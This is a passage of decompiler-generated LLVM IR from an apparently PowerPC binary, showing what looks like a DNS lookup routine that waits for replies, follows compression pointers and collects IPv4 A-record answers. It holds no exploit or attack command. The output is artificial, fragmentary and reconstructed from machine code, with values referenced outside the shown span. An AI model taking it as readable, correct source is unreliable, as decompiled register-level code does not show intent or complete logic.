  br i1 %v2_10008248148, label %dec_label_pc_1000824c, label %dec_label_pc_10008240.dec_label_pc_10008240_crit_edge

dec_label_pc_10008240.dec_label_pc_10008240_crit_edge: ; preds = %dec_label_pc_10008208, %dec_label_pc_10008240.dec_label_pc_10008240_crit_edge
  %v1_10008244149 = phi i32 [ %v1_10008244, %dec_label_pc_10008240.dec_label_pc_10008240_crit_edge ], [ %v1_10008244145, %dec_label_pc_10008208 ]
  %v0_10008240.pre = load i32, i32* %r11.global-to-local, align 4
  %v2_10008240 = load i32, i32* @r31, align 4
  %v3_10008240 = add i32 %v2_10008240, %v1_10008244149
  %v4_10008240 = inttoptr i32 %v3_10008240 to i32*
  store i32 %v0_10008240.pre, i32* %v4_10008240, align 4
  %v0_10008244 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008244 = add i32 %v0_10008244, 4
  store i32 %v1_10008244, i32* %r9.global-to-local, align 4
  %v0_10008248 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008248 = add i32 %v0_10008248, -1
  store i32 %v1_10008248, i32* %ctr.global-to-local, align 4
  %v2_10008248 = icmp eq i32 %v1_10008248, 0
  br i1 %v2_10008248, label %dec_label_pc_1000824c, label %dec_label_pc_10008240.dec_label_pc_10008240_crit_edge

dec_label_pc_1000824c:                            ; preds = %dec_label_pc_10008240.dec_label_pc_10008240_crit_edge, %dec_label_pc_10008208
  %v0_1000824c = load i32, i32* @r30, align 4
  %v1_1000824c = call i32 @__asm_rlwinm(i32 %v0_1000824c, i32 29, i32 3, i32 29)
  store i32 %v1_1000824c, i32* %r9.global-to-local, align 4
  store i32 %v2_10008250, i32* %r0.global-to-local, align 4
  %v2_10008254 = add i32 %v1_1000824c, %v2_10008250
  store i32 %v2_10008254, i32* %r29.global-to-local, align 4
  %v0_10008258 = load i32, i32* @r30, align 4
  %v1_10008258 = urem i32 %v0_10008258, 32
  store i32 %v1_10008258, i32* %r28.global-to-local, align 4
  %v1_1000825c = add i32 %v2_10008254, 28
  %v2_1000825c = inttoptr i32 %v1_1000825c to i32*
  %v3_1000825c = load i32, i32* %v2_1000825c, align 4
  %v3_10008264 = shl i32 1, %v1_10008258
  %v1_10008268 = add i32 %v0_10008258, 1
  %v2_1000826c = or i32 %v3_10008264, %v3_1000825c
  store i32 %v2_1000826c, i32* %r9.global-to-local, align 4
  store i32 %v2_1000826c, i32* %v2_1000825c, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 %v2_10008284, i32* %r7.global-to-local, align 4
  store i32 5, i32* %stack_var_-4308, align 4
  store i32 268468884, i32* @lr, align 4
  %v5_10008290 = call i32 @function_1000b6b8(i32 %v1_10008268, i32 %v2_1000812c, i32 0, i32 0, i32 %v2_10008284)
  %v3_10008294 = icmp eq i32 %v5_10008290, -1
  br i1 %v3_10008294, label %dec_label_pc_10008308, label %dec_label_pc_1000829c

dec_label_pc_1000829c:                            ; preds = %dec_label_pc_1000824c
  %v3_1000829c = icmp eq i32 %v5_10008290, 0
  br i1 %v3_1000829c, label %dec_label_pc_100082e8, label %dec_label_pc_100082a4

dec_label_pc_100082a4:                            ; preds = %dec_label_pc_1000829c
  %v0_100082a4 = load i32, i32* %r29.global-to-local, align 4
  %v1_100082a4 = add i32 %v0_100082a4, 28
  %v2_100082a4 = inttoptr i32 %v1_100082a4 to i32*
  %v3_100082a4 = load i32, i32* %v2_100082a4, align 4
  %v1_100082a8 = load i32, i32* %r28.global-to-local, align 4
  %v2_100082a8 = urem i32 %v1_100082a8, 32
  %v3_100082a8 = sub i32 0, %v1_100082a8
  %v4_100082a8 = urem i32 %v3_100082a8, 32
  %v5_100082a8 = shl i32 %v3_100082a4, %v4_100082a8
  %v6_100082a8 = xor i32 %v4_100082a8, 31
  %v7_100082a8 = lshr i32 %v3_100082a4, %v6_100082a8
  %v8_100082a8 = udiv i32 %v7_100082a8, 2
  %v9_100082a8 = or i32 %v8_100082a8, %v5_100082a8
  %v10_100082a8 = and i32 %v1_100082a8, 32
  %v11_100082a8 = icmp ne i32 %v10_100082a8, 0
  %v12_100082a8 = lshr i32 -1, %v2_100082a8
  %v13_100082a8 = select i1 %v11_100082a8, i32 0, i32 %v12_100082a8
  %v14_100082a8 = and i32 %v9_100082a8, %v13_100082a8
  %v15_100082a8 = ashr i32 %v3_100082a4, 31
  %v16_100082a8 = sub i32 -1, %v13_100082a8
  %v17_100082a8 = and i32 %v15_100082a8, %v16_100082a8
  %v18_100082a8 = or i32 %v14_100082a8, %v17_100082a8
  store i32 %v18_100082a8, i32* %r0.global-to-local, align 4
  %v1_100082ac = urem i32 %v18_100082a8, 2
  store i32 %v1_100082ac, i32* %r9.global-to-local, align 4
  %v3_100082ac = icmp eq i32 %v1_100082ac, 0
  br i1 %v3_100082ac, label %dec_label_pc_10008308, label %dec_label_pc_100082b4

dec_label_pc_100082b4:                            ; preds = %dec_label_pc_100082a4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_100082c8 = load i32, i32* @r30, align 4
  store i32 268468944, i32* @lr, align 4
  %v6_100082cc = call i32 @function_1000c0c8(i32 %v0_100082c8, i32 %v2_10008134, i32 2048, i32 16384, i32 0, i32 0)
  store i32 %v6_100082cc, i32* %r29.global-to-local, align 4
  %v0_100082d4 = load i32, i32* %r26.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100082dc.183 to i32), i32* @lr, align 4
  %v1_100082d8 = inttoptr i32 %v0_100082d4 to i8*
  %v2_100082d8 = call i32 @function_1000ab64(i8* %v1_100082d8)
  %v1_100082dc = add i32 %v2_100082d8, 17
  %v2_100082e0 = icmp ult i32 %v6_100082cc, %v1_100082dc
  br i1 %v2_100082e0, label %dec_label_pc_100082e8, label %dec_label_pc_1000836c

dec_label_pc_100082e8:                            ; preds = %dec_label_pc_1000836c, %dec_label_pc_100082b4, %dec_label_pc_1000838c, %dec_label_pc_1000829c
  %v0_100082e8 = load i32, i32* %r27.global-to-local, align 4
  %v3_100082e8 = icmp eq i32 %v0_100082e8, 5
  br i1 %v3_100082e8, label %dec_label_pc_10008308, label %dec_label_pc_100082f0

dec_label_pc_100082f0:                            ; preds = %dec_label_pc_100082f8, %dec_label_pc_100082e8
  %v0_100082f0 = phi i32 [ %v0_10008300, %dec_label_pc_100082f8 ], [ %v0_100082e8, %dec_label_pc_100082e8 ]
  %v1_100082f0 = add i32 %v0_100082f0, 1
  store i32 %v1_100082f0, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_100081b0

dec_label_pc_100082f8:                            ; preds = %dec_label_pc_100081ec, %dec_label_pc_100081d8, %dec_label_pc_100081bc
  store i32 268468992, i32* @lr, align 4
  %v1_100082fc = call i32 @function_1000cce4(i32 1)
  %v0_10008300 = load i32, i32* %r27.global-to-local, align 4
  %v3_10008300 = icmp eq i32 %v0_10008300, 5
  br i1 %v3_10008300, label %dec_label_pc_10008308, label %dec_label_pc_100082f0

dec_label_pc_10008308:                            ; preds = %dec_label_pc_100082f8, %dec_label_pc_100082e8, %dec_label_pc_100082a4, %dec_label_pc_1000824c, %dec_label_pc_10008398.backedge, %dec_label_pc_10008398.preheader
  store i32 268469008, i32* @lr, align 4
  %v0_1000830c = call i32 @function_1000b3f0()
  %v0_10008310 = load i32, i32* %r25.global-to-local, align 4
  %v1_10008310 = inttoptr i32 %v0_10008310 to i8*
  %v2_10008310 = load i8, i8* %v1_10008310, align 1
  %v3_10008310 = zext i8 %v2_10008310 to i32
  store i32 %v3_10008310, i32* %r0.global-to-local, align 4
  %v3_10008314 = icmp eq i8 %v2_10008310, 0
  br i1 %v3_10008314, label %dec_label_pc_10008484, label %dec_label_pc_1000831c

dec_label_pc_1000831c:                            ; preds = %dec_label_pc_10008308, %dec_label_pc_10008494
  %v0_10008320 = phi i32 [ %v0_10008310, %dec_label_pc_10008308 ], [ 0, %dec_label_pc_10008494 ]
  store i32 %v0_10008054, i32* %r0.global-to-local, align 4
  %v1_10008334 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000802c)
  store i32 %v0_10008074, i32* %r28.global-to-local, align 4
  store i32 %v0_10008034, i32* %r29.global-to-local, align 4
  ret i32 %v0_10008320

dec_label_pc_1000836c:                            ; preds = %dec_label_pc_100082b4
  store i32 %v2_10008160, i32* %r26.global-to-local, align 4
  store i32 268469112, i32* @lr, align 4
  %v2_10008374 = call i32 @function_1000ab64(i8* %v1_10008374)
  %v3_10008378 = load i16, i16* %stack_var_-2108, align 2
  %v4_10008378 = sext i16 %v3_10008378 to i32
  store i32 %v4_10008378, i32* %r0.global-to-local, align 4
  %v0_1000837c = load i32, i32* %r20.global-to-local, align 4
  %v1_10008380 = load i32, i32* %r22.global-to-local, align 4
  %v4_10008380 = icmp eq i32 %v4_10008378, %v1_10008380
  %v2_1000837c = add i32 %v2_10008374, 5
  %v1_10008384 = add i32 %v2_1000837c, %v0_1000837c
  br i1 %v4_10008380, label %dec_label_pc_1000838c, label %dec_label_pc_100082e8

dec_label_pc_1000838c:                            ; preds = %dec_label_pc_1000836c
  store i32 %v4_1000838c, i32* %r28.global-to-local, align 4
  br i1 %v3_10008390, label %dec_label_pc_100082e8, label %dec_label_pc_10008398.preheader

dec_label_pc_10008398.preheader:                  ; preds = %dec_label_pc_1000838c
  %v1_100083988 = add nsw i32 %v4_1000838c, -1
  store i32 %v1_100083988, i32* %r0.global-to-local, align 4
  %v1_100083a09 = urem i32 %v1_100083988, 65536
  store i32 %v1_100083a09, i32* %r28.global-to-local, align 4
  store i32 65535, i32* %r9.global-to-local, align 4
  %v4_100083a811 = icmp eq i32 %v1_100083a09, 65535
  br i1 %v4_100083a811, label %dec_label_pc_10008308, label %dec_label_pc_100083b0

dec_label_pc_100083b0:                            ; preds = %dec_label_pc_10008398.preheader, %dec_label_pc_10008398.backedge
  %v0_1000839849 = phi i32 [ %v1_100083a0, %dec_label_pc_10008398.backedge ], [ %v1_100083a09, %dec_label_pc_10008398.preheader ]
  %v0_1000840c = phi i32 [ %storemerge, %dec_label_pc_10008398.backedge ], [ %v1_10008384, %dec_label_pc_10008398.preheader ]
  store i32 %v0_1000840c, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_100083bc110 = inttoptr i32 %v0_1000840c to i8*
  %v2_100083bc111 = load i8, i8* %v1_100083bc110, align 1
  %v3_100083bc112 = zext i8 %v2_100083bc111 to i32
  store i32 %v3_100083bc112, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  %v3_100083c4114 = icmp eq i8 %v2_100083bc111, 0
  br i1 %v3_100083c4114, label %dec_label_pc_10008408, label %dec_label_pc_100083d4.preheader

dec_label_pc_100083d4.preheader:                  ; preds = %dec_label_pc_100083b0, %dec_label_pc_100084a4
  %v2_100083bc120 = phi i8 [ %v2_100083bc, %dec_label_pc_100084a4 ], [ %v2_100083bc111, %dec_label_pc_100083b0 ]
  %v3_100083cc123.in = phi i8 [ %v2_100083bc, %dec_label_pc_100084a4 ], [ %v2_100083bc111, %dec_label_pc_100083b0 ]
  %v1_100083c8122.in = phi i32 [ %v3_100083bc, %dec_label_pc_100084a4 ], [ %v3_100083bc112, %dec_label_pc_100083b0 ]
  %v1_100083c0121 = phi i32 [ %v1_100083c0, %dec_label_pc_100084a4 ], [ 1, %dec_label_pc_100083b0 ]
  %v0_100083bc119 = phi i32 [ %v1_100084a8, %dec_label_pc_100084a4 ], [ %v0_1000840c, %dec_label_pc_100083b0 ]
  %v0_100083c0118 = phi i32 [ %v0_100083c028, %dec_label_pc_100084a4 ], [ 0, %dec_label_pc_100083b0 ]
  %v0_10008408117 = phi i32 [ %v2_100084a4, %dec_label_pc_100084a4 ], [ 1, %dec_label_pc_100083b0 ]
  br label %dec_label_pc_100083d4

dec_label_pc_100083d4:                            ; preds = %dec_label_pc_100083d4.preheader, %dec_label_pc_100083d8
  %v1_100084a4 = phi i32 [ 0, %dec_label_pc_100083d8 ], [ %v1_100083c0121, %dec_label_pc_100083d4.preheader ]
  %v0_100083e4.in = phi i32 [ %v3_100083f4, %dec_label_pc_100083d8 ], [ %v1_100083c8122.in, %dec_label_pc_100083d4.preheader ]
  %v0_100084a8 = phi i32 [ %v2_100083f0, %dec_label_pc_100083d8 ], [ %v0_100083bc119, %dec_label_pc_100083d4.preheader ]
  %v0_100083d4.in = phi i8 [ %v2_100083f4, %dec_label_pc_100083d8 ], [ %v3_100083cc123.in, %dec_label_pc_100083d4.preheader ]
  %v1_100083d4.in = phi i8 [ %v2_100083f4, %dec_label_pc_100083d8 ], [ %v2_100083bc120, %dec_label_pc_100083d4.preheader ]
  %v0_100083c028 = phi i32 [ 1, %dec_label_pc_100083d8 ], [ %v0_100083c0118, %dec_label_pc_100083d4.preheader ]
  %v0_100083d4 = icmp eq i8 %v0_100083d4.in, -65
  %v1_100083d4 = icmp ult i8 %v1_100083d4.in, -65
  %v2_100083d4 = or i1 %v0_100083d4, %v1_100083d4
  br i1 %v2_100083d4, label %dec_label_pc_100084a4, label %dec_label_pc_100083d8

dec_label_pc_100083d8:                            ; preds = %dec_label_pc_100083d4
  %v0_100083e4 = mul nuw nsw i32 %v0_100083e4.in, 256
  %v1_100083d8 = add i32 %v0_100084a8, 1
  %v2_100083d8 = inttoptr i32 %v1_100083d8 to i8*
  %v3_100083d8 = load i8, i8* %v2_100083d8, align 1
  %v4_100083d8 = zext i8 %v3_100083d8 to i32
  store i32 1, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_100083e4 = or i32 %v4_100083d8, -49152
  %v1_100083ec = add nsw i32 %v2_100083e4, %v0_100083e4
  %v0_100083f0 = load i32, i32* %r19.global-to-local, align 4
  %v2_100083f0 = add i32 %v1_100083ec, %v0_100083f0
  store i32 %v2_100083f0, i32* %r9.global-to-local, align 4
  %v1_100083f4 = inttoptr i32 %v2_100083f0 to i8*
  %v2_100083f4 = load i8, i8* %v1_100083f4, align 1
  %v3_100083f4 = zext i8 %v2_100083f4 to i32
  store i32 %v3_100083f4, i32* %r0.global-to-local, align 4
  %v3_100083f8 = icmp eq i8 %v2_100083f4, 0
  br i1 %v3_100083f8, label %dec_label_pc_10008408, label %dec_label_pc_100083d4

dec_label_pc_10008408:                            ; preds = %dec_label_pc_100083b0, %dec_label_pc_100084a4, %dec_label_pc_100083d8
  %v0_10008408103 = phi i32 [ %v0_10008408117, %dec_label_pc_100083d8 ], [ 1, %dec_label_pc_100083b0 ], [ %v2_100084a4, %dec_label_pc_100084a4 ]
  %v1_10008408 = phi i32 [ 1, %dec_label_pc_100083d8 ], [ 0, %dec_label_pc_100083b0 ], [ %v0_100083c028, %dec_label_pc_100084a4 ]
  %v2_10008408 = add i32 %v1_10008408, %v0_10008408103
  store i32 %v2_10008408, i32* %r10.global-to-local, align 4
  %v2_1000840c = add i32 %v2_10008408, %v0_1000840c
  %v3_1000840c = inttoptr i32 %v2_1000840c to i16*
  %v4_1000840c = load i16, i16* %v3_1000840c, align 2
  %v5_1000840c = zext i16 %v4_1000840c to i32
  store i32 %v5_1000840c, i32* %r0.global-to-local, align 4
  %v1_10008414 = add i32 %v2_1000840c, 10
  store i32 %v1_10008414, i32* @r29, align 4
  %v3_10008418 = icmp eq i16 %v4_1000840c, 1
  br i1 %v3_10008418, label %dec_label_pc_100084bc, label %dec_label_pc_10008420

dec_label_pc_10008420:                            ; preds = %dec_label_pc_100084bc, %dec_label_pc_10008408
  store i32 %v1_10008414, i32* %r9.global-to-local, align 4
  %v1_1000842c125 = inttoptr i32 %v1_10008414 to i8*
  %v2_1000842c126 = load i8, i8* %v1_1000842c125, align 1
  %v3_1000842c127 = zext i8 %v2_1000842c126 to i32
  store i32 %v3_1000842c127, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  %v3_10008434129 = icmp eq i8 %v2_1000842c126, 0
  %v1_10008438130 = mul nuw nsw i32 %v3_1000842c127, 256
  store i32 %v1_10008438130, i32* %r10.global-to-local, align 4
  br i1 %v3_10008434129, label %dec_label_pc_10008478, label %dec_label_pc_10008444.preheader

dec_label_pc_10008444.preheader:                  ; preds = %dec_label_pc_10008420, %dec_label_pc_100084b0
  %v2_1000842c135 = phi i8 [ %v2_1000842c, %dec_label_pc_100084b0 ], [ %v2_1000842c126, %dec_label_pc_10008420 ]
  %v3_1000843c138.in = phi i8 [ %v2_1000842c, %dec_label_pc_100084b0 ], [ %v2_1000842c126, %dec_label_pc_10008420 ]
  %v1_10008438137 = phi i32 [ %v1_10008438, %dec_label_pc_100084b0 ], [ %v1_10008438130, %dec_label_pc_10008420 ]
  %v1_10008430136 = phi i32 [ %v1_10008430, %dec_label_pc_100084b0 ], [ 1, %dec_label_pc_10008420 ]
  %v0_1000842c134 = phi i32 [ %v1_100084b4, %dec_label_pc_100084b0 ], [ %v1_10008414, %dec_label_pc_10008420 ]
  %v0_10008430133 = phi i32 [ %v0_1000843038, %dec_label_pc_100084b0 ], [ 0, %dec_label_pc_10008420 ]
  %v0_10008478132 = phi i32 [ %v2_100084b0, %dec_label_pc_100084b0 ], [ 1, %dec_label_pc_10008420 ]
  br label %dec_label_pc_10008444

dec_label_pc_10008444:                            ; preds = %dec_label_pc_10008444.preheader, %dec_label_pc_10008448
  %v1_100084b0 = phi i32 [ 0, %dec_label_pc_10008448 ], [ %v1_10008430136, %dec_label_pc_10008444.preheader ]
  %v0_10008454 = phi i32 [ %v1_1000846c, %dec_label_pc_10008448 ], [ %v1_10008438137, %dec_label_pc_10008444.preheader ]
  %v0_100084b4 = phi i32 [ %v2_10008460, %dec_label_pc_10008448 ], [ %v0_1000842c134, %dec_label_pc_10008444.preheader ]
  %v0_10008444.in = phi i8 [ %v2_10008464, %dec_label_pc_10008448 ], [ %v3_1000843c138.in, %dec_label_pc_10008444.preheader ]
  %v1_10008444.in = phi i8 [ %v2_10008464, %dec_label_pc_10008448 ], [ %v2_1000842c135, %dec_label_pc_10008444.preheader ]
  %v0_1000843038 = phi i32 [ 1, %dec_label_pc_10008448 ], [ %v0_10008430133, %dec_label_pc_10008444.preheader ]
  %v0_10008444 = icmp eq i8 %v0_10008444.in, -65
  %v1_10008444 = icmp ult i8 %v1_10008444.in, -65
  %v2_10008444 = or i1 %v0_10008444, %v1_10008444
  br i1 %v2_10008444, label %dec_label_pc_100084b0, label %dec_label_pc_10008448

dec_label_pc_10008448:                            ; preds = %dec_label_pc_10008444
  %v1_10008448 = add i32 %v0_100084b4, 1
  %v2_10008448 = inttoptr i32 %v1_10008448 to i8*
  %v3_10008448 = load i8, i8* %v2_10008448, align 1
  %v4_10008448 = zext i8 %v3_10008448 to i32
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_10008454 = or i32 %v4_10008448, -49152
  %v1_1000845c = add nsw i32 %v2_10008454, %v0_10008454
  %v0_10008460 = load i32, i32* %r19.global-to-local, align 4
  %v2_10008460 = add i32 %v1_1000845c, %v0_10008460
  store i32 %v2_10008460, i32* %r9.global-to-local, align 4
  %v1_10008464 = inttoptr i32 %v2_10008460 to i8*
  %v2_10008464 = load i8, i8* %v1_10008464, align 1
  %v3_10008464 = zext i8 %v2_10008464 to i32
  store i32 %v3_10008464, i32* %r0.global-to-local, align 4
  %v3_10008468 = icmp eq i8 %v2_10008464, 0
  %v1_1000846c = mul nuw nsw i32 %v3_10008464, 256
  store i32 %v1_1000846c, i32* %r10.global-to-local, align 4
  br i1 %v3_10008468, label %dec_label_pc_10008478, label %dec_label_pc_10008444

dec_label_pc_10008478:                            ; preds = %dec_label_pc_10008420, %dec_label_pc_100084b0, %dec_label_pc_10008448
  %v0_10008478109 = phi i32 [ %v0_10008478132, %dec_label_pc_10008448 ], [ 1, %dec_label_pc_10008420 ], [ %v2_100084b0, %dec_label_pc_100084b0 ]
  %v1_10008478 = phi i32 [ 1, %dec_label_pc_10008448 ], [ 0, %dec_label_pc_10008420 ], [ %v0_1000843038, %dec_label_pc_100084b0 ]
  %v2_10008478 = add i32 %v1_10008478, %v0_10008478109
  %v2_1000847c = add i32 %v2_10008478, %v1_10008414
  br label %dec_label_pc_10008398.backedge

dec_label_pc_10008398.backedge:                   ; preds = %dec_label_pc_10008478, %dec_label_pc_10008528
  %v0_10008398 = phi i32 [ %v0_1000839849, %dec_label_pc_10008478 ], [ %v0_10008398.pre, %dec_label_pc_10008528 ]
  %storemerge = phi i32 [ %v2_1000847c, %dec_label_pc_10008478 ], [ %v2_1000852c, %dec_label_pc_10008528 ]
  %v1_10008398 = add i32 %v0_10008398, -1
  store i32 %v1_10008398, i32* %r0.global-to-local, align 4
  %v1_100083a0 = urem i32 %v1_10008398, 65536
  store i32 %v1_100083a0, i32* %r28.global-to-local, align 4
  store i32 65535, i32* %r9.global-to-local, align 4
  %v4_100083a8 = icmp eq i32 %v1_100083a0, 65535
  br i1 %v4_100083a8, label %dec_label_pc_10008308, label %dec_label_pc_100083b0

dec_label_pc_10008484:                            ; preds = %dec_label_pc_10008308
  %v1_10008484 = add i32 %v0_10008310, 4
  %v2_10008484 = inttoptr i32 %v1_10008484 to i32*
  %v3_10008484 = load i32, i32* %v2_10008484, align 4
  store i32 %v3_10008484, i32* @r3, align 4
  %v3_10008488 = icmp eq i32 %v3_10008484, 0
  br i1 %v3_10008488, label %dec_label_pc_10008494, label %dec_label_pc_10008490

dec_label_pc_10008490:                            ; preds = %dec_label_pc_10008484
  store i32 268469396, i32* @lr, align 4
  %v0_10008490 = call i32 @function_1000c5b8()
  %v0_10008494.pre = load i32, i32* %r25.global-to-local, align 4
  br label %dec_label_pc_10008494

dec_label_pc_10008494:                            ; preds = %dec_label_pc_10008484, %dec_label_pc_10008490
  %v0_10008494 = phi i32 [ %v0_10008310, %dec_label_pc_10008484 ], [ %v0_10008494.pre, %dec_label_pc_10008490 ]
  store i32 %v0_10008494, i32* @r3, align 4
  store i32 0, i32* %r25.global-to-local, align 4
  store i32 268469408, i32* @lr, align 4
  %v0_1000849c = call i32 @function_1000c5b8()
  br label %dec_label_pc_1000831c

dec_label_pc_100084a4:                            ; preds = %dec_label_pc_100083d4
  %v2_100084a4 = add i32 %v1_100084a4, %v0_10008408117
  store i32 %v2_100084a4, i32* %r10.global-to-local, align 4
  %v1_100084a8 = add i32 %v0_100084a8, 1
  store i32 %v1_100084a8, i32* %r9.global-to-local, align 4
  %v1_100083bc = inttoptr i32 %v1_100084a8 to i8*
  %v2_100083bc = load i8, i8* %v1_100083bc, align 1
  %v3_100083bc = zext i8 %v2_100083bc to i32
  store i32 %v3_100083bc, i32* %r0.global-to-local, align 4
  %v1_100083c0 = xor i32 %v0_100083c028, 1
  store i32 %v1_100083c0, i32* %r11.global-to-local, align 4
  %v3_100083c4 = icmp eq i8 %v2_100083bc, 0
  br i1 %v3_100083c4, label %dec_label_pc_10008408, label %dec_label_pc_100083d4.preheader

dec_label_pc_100084b0:                            ; preds = %dec_label_pc_10008444
  %v2_100084b0 = add i32 %v1_100084b0, %v0_10008478132
  %v1_100084b4 = add i32 %v0_100084b4, 1
  store i32 %v1_100084b4, i32* %r9.global-to-local, align 4
  %v1_1000842c = inttoptr i32 %v1_100084b4 to i8*
  %v2_1000842c = load i8, i8* %v1_1000842c, align 1
  %v3_1000842c = zext i8 %v2_1000842c to i32
  store i32 %v3_1000842c, i32* %r0.global-to-local, align 4
  %v1_10008430 = xor i32 %v0_1000843038, 1
  store i32 %v1_10008430, i32* %r11.global-to-local, align 4
  %v3_10008434 = icmp eq i8 %v2_1000842c, 0
  %v1_10008438 = mul nuw nsw i32 %v3_1000842c, 256
  store i32 %v1_10008438, i32* %r10.global-to-local, align 4
  br i1 %v3_10008434, label %dec_label_pc_10008478, label %dec_label_pc_10008444.preheader

dec_label_pc_100084bc:                            ; preds = %dec_label_pc_10008408
  %v1_100084bc = add i32 %v2_1000840c, 2
  %v2_100084bc = inttoptr i32 %v1_100084bc to i16*
  %v3_100084bc = load i16, i16* %v2_100084bc, align 2
  %v4_100084bc = zext i16 %v3_100084bc to i32
  store i32 %v4_100084bc, i32* %r0.global-to-local, align 4
  %v3_100084c0 = icmp eq i16 %v3_100084bc, 1
  br i1 %v3_100084c0, label %dec_label_pc_100084c8, label %dec_label_pc_10008420

dec_label_pc_100084c8:                            ; preds = %dec_label_pc_100084bc
  %v1_100084c8 = add i32 %v2_1000840c, 8
  %v2_100084c8 = inttoptr i32 %v1_100084c8 to i16*
  %v3_100084c8 = load i16, i16* %v2_100084c8, align 2
  %v4_100084c8 = zext i16 %v3_100084c8 to i32
  store i32 %v4_100084c8, i32* %r0.global-to-local, align 4
  %v3_100084cc = icmp eq i16 %v3_100084c8, 4
  br i1 %v3_100084cc, label %dec_label_pc_100084d4, label %dec_label_pc_10008528

dec_label_pc_100084d4:                            ; preds = %dec_label_pc_100084c8
  %v2_100084d4 = inttoptr i32 %v1_10008414 to i8*
  %v3_100084d4 = load i8, i8* %v2_100084d4, align 1
  %v4_100084d4 = zext i8 %v3_100084d4 to i32
  store i32 %v4_100084d4, i32* %r0.global-to-local, align 4
  store i32 %v4_100084d4, i32* %stack_var_-4312, align 4
  %v1_100084dc = add i32 %v2_1000840c, 11
  %v2_100084dc = inttoptr i32 %v1_100084dc to i8*
  %v3_100084dc = load i8, i8* %v2_100084dc, align 1
  %v4_100084dc = zext i8 %v3_100084dc to i32
  store i32 %v4_100084dc, i32* %r9.global-to-local, align 4
  %v1_100084e4 = add i32 %v2_1000840c, 12
  %v2_100084e4 = inttoptr i32 %v1_100084e4 to i8*
  %v3_100084e4 = load i8, i8* %v2_100084e4, align 1
  %v4_100084e4 = zext i8 %v3_100084e4 to i32
  store i32 %v4_100084e4, i32* %r0.global-to-local, align 4
  %v1_100084ec = add i32 %v2_1000840c, 13
  %v2_100084ec = inttoptr i32 %v1_100084ec to i8*
  %v3_100084ec = load i8, i8* %v2_100084ec, align 1
  %v4_100084ec = zext i8 %v3_100084ec to i32
  store i32 %v4_100084ec, i32* %r9.global-to-local, align 4
  %v0_100084f4 = load i32, i32* %r25.global-to-local, align 4
  %v1_100084f4 = inttoptr i32 %v0_100084f4 to i8*
  %v2_100084f4 = load i8, i8* %v1_100084f4, align 1
  %v3_100084f4 = zext i8 %v2_100084f4 to i32
  %v1_100084f8 = add i32 %v0_100084f4, 4
  %v2_100084f8 = inttoptr i32 %v1_100084f8 to i32*
  %v3_100084f8 = load i32, i32* %v2_100084f8, align 4
  %v1_100084fc = mul nuw nsw i32 %v3_100084f4, 4
  %v1_10008500 = add nuw nsw i32 %v1_100084fc, 4
  store i32 268469512, i32* @lr, align 4
  %v3_10008504 = sext i8 %v3_100084ec to i32
  %v4_10008504 = call i32 @function_1000c6b8(i32 %v3_100084f8, i32 %v1_10008500, i32 %v3_10008504)
  %v0_10008508 = load i32, i32* %r25.global-to-local, align 4
  %v1_10008508 = inttoptr i32 %v0_10008508 to i8*
  %v2_10008508 = load i8, i8* %v1_10008508, align 1
  %v3_10008508 = zext i8 %v2_10008508 to i32
  %v3_1000850c = load i32, i32* %stack_var_-4312, align 4
  store i32 %v3_1000850c, i32* %r0.global-to-local, align 4
  %v1_10008510 = add nuw nsw i32 %v3_10008508, 1
  store i32 %v1_10008510, i32* %r11.global-to-local, align 4
  %v1_10008514 = mul nuw nsw i32 %v3_10008508, 4
  store i32 %v1_10008514, i32* %r9.global-to-local, align 4
  %v3_10008518 = add i32 %v1_10008514, %v4_10008504
  %v4_10008518 = inttoptr i32 %v3_10008518 to i32*
  store i32 %v3_1000850c, i32* %v4_10008518, align 4
  %v0_1000851c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000851c = trunc i32 %v0_1000851c to i8
  %v2_1000851c = load i32, i32* %r25.global-to-local, align 4
  %v3_1000851c = inttoptr i32 %v2_1000851c to i8*
  store i8 %v1_1000851c, i8* %v3_1000851c, align 1
  %v1_10008520 = load i32, i32* %r25.global-to-local, align 4
  %v2_10008520 = add i32 %v1_10008520, 4
  %v3_10008520 = inttoptr i32 %v2_10008520 to i32*
  store i32 %v4_10008504, i32* %v3_10008520, align 4
  %v0_10008524 = load i32, i32* @r31, align 4
  %v1_10008524 = add i32 %v0_10008524, 8
  %v2_10008524 = inttoptr i32 %v1_10008524 to i16*
  %v3_10008524 = load i16, i16* %v2_10008524, align 2
  %v4_10008524 = zext i16 %v3_10008524 to i32
  store i32 %v4_10008524, i32* %r0.global-to-local, align 4
  %v0_1000852c.pre = load i32, i32* @r29, align 4
  %v0_10008398.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10008528

dec_label_pc_10008528:                            ; preds = %dec_label_pc_100084c8, %dec_label_pc_100084d4
  %v0_10008398.pre = phi i32 [ %v0_1000839849, %dec_label_pc_100084c8 ], [ %v0_10008398.pre.pre, %dec_label_pc_100084d4 ]
  %v0_1000852c = phi i32 [ %v1_10008414, %dec_label_pc_100084c8 ], [ %v0_1000852c.pre, %dec_label_pc_100084d4 ]
  %v0_10008528 = phi i32 [ %v4_100084c8, %dec_label_pc_100084c8 ], [ %v4_10008524, %dec_label_pc_100084d4 ]
  store i32 %v0_10008528, i32* %r0.global-to-local, align 4
  %v2_1000852c = add i32 %v0_10008528, %v0_1000852c
  br label %dec_label_pc_10008398.backedge

dec_label_pc_100080c8.preheader.thread:           ; preds = %dec_label_pc_10008024
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_100080c81355 = or i32 %v2_10008090, 1
  store i32 %v1_100080c81355, i32* %r11.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100080f8

; uselistorder directives
  uselistorder i32 %v1_10008514, { 1, 0 }
  uselistorder i32 %v4_10008504, { 1, 0 }
  uselistorder i32 %v1_10008430, { 1, 0 }
